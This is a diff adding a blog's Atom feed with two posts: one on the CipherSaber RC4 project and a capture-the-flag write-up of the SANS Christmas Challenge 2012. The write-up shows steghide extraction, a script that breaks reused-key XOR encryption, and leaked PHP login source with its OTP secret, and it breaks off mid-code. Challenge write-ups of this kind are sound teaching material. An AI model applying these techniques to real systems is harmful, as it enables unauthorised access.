@@ -1,0 +1,1063 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>All Your Base Are Belong To Me</title><link href="https://allyourbase.utouch.fr/" rel="alternate"></link><link href="https://allyourbase.utouch.fr/feeds/all/atom.xml" rel="self"></link><id>https://allyourbase.utouch.fr/</id><updated>2013-02-03T01:42:00+01:00</updated><entry><title>May the Cipher be with you</title><link href="https://allyourbase.utouch.fr/may-the-cipher-be-with-you.html" rel="alternate"></link><updated>2013-02-03T01:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-02-03:may-the-cipher-be-with-you.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/ciphersaber-logo.png"&gt;&lt;img alt="ciphersaber-logo" src="/images/ciphersaber-logo.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;NB: I know that implementing cryptographic algorithms yourself is
+dangerous. There are many implementation problems people won't think
+about, like memory management. I just wanted to talk about the
+CipherSaber because I think it's an old, yet neat project. I think it's
+important to sensitize people about cryptography and the regulations
+around its usage. &lt;strong&gt;If you want to use cryptography to protect your
+privacy, I suggest you look at a more serious project like PGP.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A few months ago, while checking my RSS feeds, I saw this discussion
+&lt;a class="reference external" href="http://www.reddit.com/r/netsec/comments/10d7zb/are_there_any_inprogress_opensource_cryptography/"&gt;http://www.reddit.com/r/netsec/comments/10d7zb/are_there_any_inprogress_opensource_cryptography/&lt;/a&gt;
+on Reddit. Since I love cryptography and FLOSS, I looked at the comment
+section, to see what kind of answers were posted.&lt;/p&gt;
+&lt;p&gt;One comment caught my attention:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/ciphersaber-comment.png"&gt;&lt;img alt="ciphersaber-comment" src="/images/ciphersaber-comment.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;What intrigued me was the idea of creating your own &amp;quot;something&amp;quot; (plus,
+the &amp;quot;something&amp;quot; had a really cool name), and I also like the fact that I
+could start right away.&lt;/p&gt;
+&lt;p&gt;So, I went to the &lt;a class="reference external" href="http://ciphersaber.gurus.org/"&gt;CipherSaber&lt;/a&gt; web
+page, to see what's what. And, being the privacy advocate that I am, I
+was not disappointed. The CipherSaber is a form of protest against US
+ban on cryptography.&lt;/p&gt;
+&lt;p&gt;It was written after 9/11, when the US government wanted to limit the
+use/publication of cryptography, in order to prevent the terrorists from
+using it. It's, of course, a ridiculous idea, since the crypto is
+&lt;em&gt;already*&lt;/em&gt; out there, and anybody can use it, even the terrorists: it's
+a little too late to try to prevent cryptography export. Plus, as stated
+in the CipherSaber web page, nothing would prevent terrorists to send
+some of their members to US universities to learn cryptography, as they
+do to learn chemistry, nuclear engineering etc.&lt;/p&gt;
+&lt;p&gt;As my good friend (okay, we've never met, but still, he has a point)
+Philip Zimmermann said:&lt;/p&gt;
+&lt;blockquote&gt;
+If privacy is outlawed, only outlaws will have privacy.&lt;/blockquote&gt;
+&lt;p&gt;The idea behind the CipherSaber, is to have everyone implementing a
+strong crypto algorithm, so that people don't rely on products that can
+be banned. The chosen algorithm is the stream cipher RC4, because it's
+strong, and easy to implement (see CipherSaber-2 in the web page to
+correct a known vulnerability in RC4). The name CipherSaber comes from
+Star Wars, because every Jedi knight has to build its own light saber,
+just like every CipherKnight should implement its own CipherSaber.&lt;/p&gt;
+&lt;p&gt;I know I'm not from the US, and I know this web page was written ten
+years ago, but I like the idea of being a part of some community, and
+Internet ban concern everyone. That's why I've decided to revamp the
+CipherKnight's certificate (the old one, in addition to being hard to
+find, is too directed towards Americans).&lt;/p&gt;
+&lt;p&gt;All you have to do to get your certificate is to enter your name, click
+the button, and decipher it using your own CipherSaber (the encryption
+key is &lt;em&gt;AlanTuring&lt;/em&gt;).&lt;/p&gt;
+&lt;form action="/cscertificate/index.php" method="post"&gt;
+     &lt;label for="name"&gt;Name&lt;/label&gt;: &lt;input name="name" type="text"&gt; &lt;input value="Get your certificate!" type="submit"&gt;
+&lt;/form&gt;&lt;p&gt;If you're old school, you can get the former CipherKnight's certificate
+&lt;a class="reference external" href="https://allyourbase.utouch.fr/wp-content/uploads/2014/08/cknight.cs1"&gt;here&lt;/a&gt;
+(the encryption key is &lt;em&gt;ThomasJefferson&lt;/em&gt;).&lt;/p&gt;
+&lt;p&gt;So go ahead, forge your own CipherSaber, print out your certificate, and
+spread the word.&lt;/p&gt;
+&lt;p&gt;May the Cipher be with you.&lt;/p&gt;
+</summary></entry><entry><title>SANS Christmas Challenge 2012</title><link href="https://allyourbase.utouch.fr/sans-christmas-challenge-2012.html" rel="alternate"></link><updated>2013-01-07T12:20:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-01-07:sans-christmas-challenge-2012.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/sans_christmas_challenge_2012_logo.jpg"&gt;&lt;img alt="sans_christmas_challenge_2012_logo" src="/images/sans_christmas_challenge_2012_logo.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;During December, SANS posted a &lt;a class="reference external" href="http://pen-testing.sans.org/holiday-challenge/2012"&gt;Christmas
+challenge&lt;/a&gt; based
+on a Christmas story.&lt;/p&gt;
+&lt;p&gt;This year, Santa is sad because he feels that nobody believes in him
+anymore, so he decides to cancel Christmas. Mrs. Claus wants to cheer
+her husband up, in order not to let children down, but her reindeer gets
+imprisoned in Southtown's dog pound. The mayor accepts to let Vixen, the
+reindeer, go if Mrs. Claus can make it snow in Southtown, which is a
+relatively hot region.&lt;/p&gt;
+&lt;p&gt;So Mrs. Claus goes to see Snow Miser, who is in charge of the cold
+weather. Unfortunately, he refuses to make it snow in Southtown, because
+it's in his brother's, Heat Miser, territory. But Heat Miser agrees to
+make it snow in Southtown as long as he's allowed to melt the North
+Pole. unfortunately, the brothers are too stubborn, and refuse to let
+each other have control over the other's territory. So Mrs. Claus takes
+it to a higher authority: Mother Nature, who forces the brothers to
+cooperate.&lt;/p&gt;
+&lt;p&gt;Since they have to collaborate, Snow Miser and Heat Miser decide to
+have a little fun and make it a competition: they both have to hack
+every level of the other brother's weather control. You can follow
+&lt;a class="reference external" href="https://twitter.com/sn0w_m1s3r"&gt;&amp;#64;sn0w_m1s3r&lt;/a&gt; and
+&lt;a class="reference external" href="https://twitter.com/h34t_m1s3r"&gt;&amp;#64;h34t_m1s3r&lt;/a&gt; on Twitter.&lt;/p&gt;
+&lt;p&gt;To make things interesting, SANS posted six questions, and will
+reward the best answers:&lt;/p&gt;
+&lt;ol class="arabic simple"&gt;
+&lt;li&gt;Where did you find the remainder of Snow Miser's Zone 1 URL?&lt;/li&gt;
+&lt;li&gt;What is the key you used with steghide to extract Snow Miser's Zone 2
+URL? Where did you find the key?&lt;/li&gt;
+&lt;li&gt;On Snow Miser's Zone 3 page, why is using the same key multiple times
+a bad idea?&lt;/li&gt;
+&lt;li&gt;What was the coding error in Zone 4 of Heat Miser's site that allowed
+you to find the URL for Zone 5?&lt;/li&gt;
+&lt;li&gt;How did you manipulate the cookie to get to Zone 5 of Heat Miser's
+Control System?&lt;/li&gt;
+&lt;li&gt;Please briefly describe the process, steps, and tools you used to
+conquer each zone, including all of the flags hidden in the comments
+of each zone page.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;I'll focus on the sixth question, while answering the first questions in
+my write up.&lt;/p&gt;
+&lt;div class="section" id="snow-miser"&gt;
+&lt;h2&gt;&lt;a class="reference external" href="http://snowmiser.counterhack.com/"&gt;Snow Miser&lt;/a&gt;&lt;/h2&gt;
+&lt;div class="section" id="zone-0"&gt;
+&lt;h3&gt;Zone 0&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;3b5a630fc67251aa5555f4979787c93f&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Unlike my brother, my fridged minions (without freakish hair) didn't
+mess up and leak our URLs to search engines or have to block them
+from the search engines. There is no vulnerability to get to the
+next zone and you will not find a vulnerability here. Move along.&lt;/p&gt;
+&lt;p&gt;Those of you with proper access, the URL you need starts with the
+following: &amp;gt; zone-1-D2E31380-50E6-4869-8A85-XXXXXXXXXXXX&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The URL is composed only of digits (0 through 9) and letters (A through
+F), which gives us 281.474.976.710.656 possible combinations. We can't
+bruteforce so many combinations (plus, it's explicitly stated in the
+challenge's rules that bruteforce is disallowed).&lt;/p&gt;
+&lt;p&gt;Fortunately, Snow Miser tweets this message:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/snow_miser_tweet_1.png"&gt;&lt;img alt="snow_miser_tweet_1" src="/images/snow_miser_tweet_1.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Here's the posted image:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/snow_miser_glass_reflection.jpg"&gt;&lt;img alt="snow_miser_glass_reflection" src="/images/snow_miser_glass_reflection.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We can see in the something interesting in the screen's reflection in
+the glass: the end of the URL we're looking for. With a tool like GIMP,
+we can manipulate the image to make it easier to read it:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/snow_miser_glass_reflection_enhanced.jpg"&gt;&lt;img alt="snow_miser_glass_reflection_enhanced" src="/images/snow_miser_glass_reflection_enhanced.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Which gives us this final URL:
+zone-1-D2E31380-50E6-4869-8A85-F9CDB3AF6226&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="zone-1"&gt;
+&lt;h3&gt;Zone 1&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;38bef0b61ba8edda377b626fe6708bfa&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+One of my minions, who has been turned into a snowman, messed up and
+changed the URL for Zone 2. If you have access to this level you can
+analyze the images and access the next zone.&lt;/blockquote&gt;
+&lt;p&gt;This message kind of points to some sort of steganography use. This is
+where the second question helps us. We know the program steghide was
+used on a image. While looking at the website's images, we can see that
+they're all PNG, except for &lt;a class="reference external" href="/images/off.jpg"&gt;this
+one&lt;/a&gt;,
+which is JPG. Since steghide doesn't support PNG, we know that the URL
+is hidden in the last image.&lt;/p&gt;
+&lt;p&gt;Now, we need to find the key, in order to extract the hidden file. If
+you open the image in a hexadecimal editor, you'll find an ASCII string,
+&amp;quot;IceIceBaby!&amp;quot;. Let's use it as the key::&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+$ steghide extract -sf off.jpg
+Enter passphrase: IceIceBaby!
+Extracted data written to tmpfile.txt
+$ cat tmpfile.txt
+zone-2-6D46A633-25D7-42C8-AF94-8E786142A3E3
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;div class="section" id="zone-2"&gt;
+&lt;h3&gt;Zone 2&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;b8231c2bac801b54f732cfbdcd7e47b7&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The same minion that messed up the Zone 2 link also messed up the
+Zone 3 link. Make sure you use the new link that starts with:&lt;/p&gt;
+&lt;p&gt;zone-3-EAB6B031-4EFA-49F1-B542-XXXXXXXXXXXX &amp;gt; &amp;gt; Please do not tweet
+the links or parts of the links.&lt;/p&gt;
+&lt;p&gt;All security issues that used to allow access to the next zone have
+been fixed. There is no vulnerability to get to the next zone and
+you will not find a vulnerability here. Move along.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Heat Miser kindly tweets:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/heat_miser_tweet_2.png"&gt;&lt;img alt="heat_miser_tweet_2" src="/images/heat_miser_tweet_2.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can retrieve Snow Miser's data
+&lt;a class="reference external" href="/docs/android.data_.tar.gz"&gt;here&lt;/a&gt;
+(sha256:
+&lt;code&gt;286387c77b533aae4d605d85a5e74c819f3e0ca7ca42b991ddd29abf9ff5a6b4&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;After extracting it, we can use some shell mojo to find files mentioning
+the zone 3 URL::&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+$ tar -xzvf android.data.tgz
+$ cd data
+$ grep -Rn &amp;quot;zone-3&amp;quot; . 2&amp;gt; /dev/null
+Binary file ./data/com.android.browser/cache/browser_state.parcel
+concordant
+Binary file
+./data/com.android.browser/cache/webviewCacheChromium/data_1 concordant
+Binary file
+./data/com.android.browser/cache/webviewCacheChromium/data_2 concordant
+Binary file ./data/com.android.browser/databases/browser2.db
+concordant
+Binary file ./data/com.android.browser/databases/browser2.db-wal
+concordant
+&lt;/pre&gt;
+&lt;p&gt;The first file looks is a browser cache file, which may contain the
+wanted URL. By reading it, we'll find:
+zone-3-EAB6B031-4EFA-49F1-B542-30EBE9EB3962&lt;/p&gt;
+&lt;/div&gt;
+&lt;div class="section" id="zone-3"&gt;
+&lt;h3&gt;Zone 3&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;08ba610172aade5d1c8ea738013a2e99&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;To reduce the impact of URL exposure or modification we have added a
+new mechanism to distribute changes to the URL (thanks to that
+minion that broke Zones 2+). Those of you with with access to Zone 4
+should have received an encryption key. This key can be used to
+decrypt the URL for Zone 4. This allows us to securely communicate
+it to you without risk of unauthorized access.&lt;/p&gt;
+&lt;p&gt;To verify your key you can check the previous Zone 4 URL:&lt;/p&gt;
+&lt;p&gt;zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B&lt;/p&gt;
+&lt;p&gt;20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238&lt;/p&gt;
+&lt;p&gt;The new Zone 4 encrypted string is:
+20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We know the cipher texts both encrypt plain texts starting with zone-4-,
+and by looking at them, we can see that they both start with the same
+letters. It hints to a bytewise encryption scheme. It turns out that
+it's a XOR encryption. The first &amp;quot;oops&amp;quot; here, is that since we're given
+a plain text and its cipher text, we can recover the whole key. Indeed,
+by the propriety of the XOR operator (here denoted by &lt;span class="formula"&gt;⊕&lt;/span&gt;):&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt;⊕&lt;i&gt;p&lt;/i&gt; = &lt;i&gt;k&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The second &amp;quot;oops&amp;quot; is using the same key twice, because now that we have
+the key, we can decrypt the second cipher text:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
+&lt;span class="c"&gt;#-*- encoding: Utf-8 -*-&lt;/span&gt;
+
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;usage: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
+
+    &lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
+    &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+
+    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
+        &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;plain2&lt;/span&gt;
+
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now let's launch this program::&lt;/p&gt;
+&lt;pre class="literal-block"&gt;
+$ ls
+xor_encrypt.py
+$ ./xor_enc.py zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B
+20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238
+20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849
+zone-4-9D469367-B60E-4E08-BDF1-FED7CC74AF33
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;div class="section" id="zone-4"&gt;
+&lt;h3&gt;Zone 4&lt;/h3&gt;
+&lt;p&gt;flag: &lt;code&gt;de32b158f102a60aba7de3ee8d5d265a&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Zone 5 requires top security. We are updating the code using svn 1.7
+and have implemented One-Time-Password (OTP) functionality to access
+Zone 5.&lt;/p&gt;
+&lt;p&gt;The passwords are in a SHA1 format, so they are unguessable.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;If we look at the source code, we can see that the One Time Password is
+sent to the zone 5 URL, so we don't have to look very far to find it.
+But if we try to access it directly, we're redirected to a page,
+noaccess.php. With this tweet, Heat Miser gives us a big hint:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/heat_miser_tweet_3.png"&gt;&lt;img alt="heat_miser_tweet_3" src="/images/heat_miser_tweet_3.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;By looking at &lt;a class="reference external" href="http://pen-testing.sans.org/blog/pen-testing/2012/12/06/all-your-svn-are-belong-to-us"&gt;the tutorial he
+gives&lt;/a&gt;
+(see, this meme doesn't get old!) we can get the index page source code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$time&lt;/span&gt;&lt;span class="s2"&gt; 7998f77a7dc74f182a76219d7ee58db38be3841c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pass&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="c1"&gt;// passwords are valid for up to 3 minutes&lt;/span&gt;
+        &lt;span class="c1"&gt;// don&amp;#39;t forget to use the server time (see the noaccess.php page)&lt;/span&gt;
+        &lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;+1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; &lt;span class="c1"&gt;// added just in case the&lt;/span&gt;
+            &lt;span class="nb"&gt;time&lt;/span&gt; &lt;span class="nx"&gt;sync&lt;/span&gt; &lt;span class="nx"&gt;is&lt;/span&gt; &lt;span class="nx"&gt;off&lt;/span&gt;
+            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
+            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-2 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
+        &lt;span class="p"&gt;);&lt;/span&gt;
+
+        &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strtolower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;FALSE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+        &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
